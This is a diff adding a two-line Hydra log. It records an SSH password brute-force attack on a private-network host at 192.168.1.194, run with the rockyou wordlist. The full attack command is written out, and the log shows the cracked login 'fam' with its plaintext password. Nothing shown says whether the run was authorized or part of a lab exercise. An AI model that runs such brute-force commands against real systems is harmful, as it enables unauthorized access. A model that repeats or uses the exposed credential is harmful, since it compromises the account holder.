@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2024-06-04 12:26:20 on 192.168.1.194 ssh (hydra -l fam -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.194:22)
+[22][ssh] host: 192.168.1.194   login: fam   password: 21RussellLucy
